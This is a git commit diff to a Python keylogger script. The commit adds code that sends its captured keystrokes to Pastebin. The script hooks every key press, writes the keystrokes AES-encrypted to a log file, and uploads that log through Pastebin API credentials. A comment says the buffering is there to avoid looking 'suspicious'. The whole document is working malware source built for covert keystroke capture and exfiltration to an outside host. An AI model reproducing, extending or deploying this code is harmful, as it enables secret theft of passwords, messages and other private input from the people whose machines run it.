e910106ec78f3c424c1452c7861dc5a88ed34861
Brannon Dorsey <brannon@brannondorsey.com>
2017-04-09 18:22:42 -0500

    Now posts to pastebin

--- src/keylogger.py
+++ src/keylogger.py
@@ -1,13 +1,26 @@
 #!/usr/bin/env python
+import pastebin_creds
 import os, sys, random
 import pyxhook
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 from Crypto import Random
+from pastebin import PastebinAPI
 
 def log(message, verbose):
     if verbose:
         print(message)
+
+def upload_to_pastebin(name, contents, pb_api, pb_api_key, pb_user_key):
+    try:
+        url = pb_api.paste(pb_api_key, 
+                           contents,
+                           paste_name=name,
+                           api_user_key=pb_user_key,
+                           paste_private='private',
+                           paste_expire_date='N')
+    except Exception as e:
+        log('[*] Uploaded {} file to pastebin: {}'.format(name, e), verbose)
 
 verbose = True if os.environ.get('LOG_VERBOSE', 1) == 1 else False
 
@@ -57,28 +70,55 @@ with open(log_file, 'w') as f:
     f.write(iv)
     log('[*] Wrote AES initialization vector to {}'.format(log_file), verbose)
 
+#-------------------------------------------------------------------------------
+
 # we don't want to log to file every keypress, because that would be suspicious
 # so instead we buffer and flush it to file every 100 keypresses
-buff_counter = dict()
-buff_counter['num_keypresses_between_log_updates'] = 100
-buff_counter['buff'] = ''
-buff_counter['keypress_count'] = 0
+buff = dict()
+buff['buff'] = ''
+buff['num_keypresses_between_log_updates'] = 10
+buff['num_keypresses_before_upload'] = 10
+buff['keypress_log_count'] = 0
+buff['keypress_upload_count'] = 0
 
-# some fancy closure to give the hook.KeyDown access to our buff_counter vars
-def getOnKeyPress(buff_counter):
+# some fancy closure to give the hook.KeyDown access to our buff vars
+def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
     def onKeyPress(event):
-        buff_counter['buff'] += '{}\n'.format(event.Key)
-        buff_counter['keypress_count'] = buff_counter['keypress_count'] + 1
-        if buff_counter['keypress_count'] == \
-           buff_counter['num_keypresses_between_log_updates']:    
+        
+        if event.Key == 'Escape':
+            exit(0)
+
+        buff['buff'] += '{}\n'.format(event.Key)
+        buff['keypress_log_count'] = buff['keypress_log_count'] + 1
+        buff['keypress_upload_count'] = buff['keypress_upload_count'] + 1
+        if buff['keypress_log_count'] == \
+           buff['num_keypresses_between_log_updates']:    
             with open(log_file, 'a') as f:
-                f.write(aes_cipher.encrypt(buff_counter['buff']))
-            buff_counter['buff'] = ''
-            buff_counter['keypress_count'] = 0
+                f.write(aes_cipher.encrypt(buff['buff']))
+            buff['buff'] = ''
+            buff['keypress_log_count'] = 0
+        if buff['keypress_upload_count'] == \
+           buff['num_keypresses_before_upload']:
+            with open(log_file, 'r') as f:
+                upload_to_pastebin(os.path.basename(
+                                        '{}_aes'.format(encrypted_aes_key)), 
+                                   f.read(), pb_api, pb_api_key, pb_user_key)
+                upload_to_pastebin(os.path.basename(log_file),
+                                   f.read(), pb_api, pb_api_key, pb_user_key)
+            buff['keypress_upload_count'] = 0
+
     return onKeyPress
 
+pb_api = PastebinAPI()
+pb_user_key = pb_api.generate_user_key(pastebin_creds.api_dev_key, 
+                                       pastebin_creds.username, 
+                                       pastebin_creds.password)
+
 hook = pyxhook.HookManager()
-hook.KeyDown = getOnKeyPress(buff_counter)
+hook.KeyDown = getOnKeyPress(buff, 
+                             pb_api, 
+                             pastebin_creds.api_dev_key, 
+                             pb_user_key)
 hook.HookKeyboard()
 
 try:
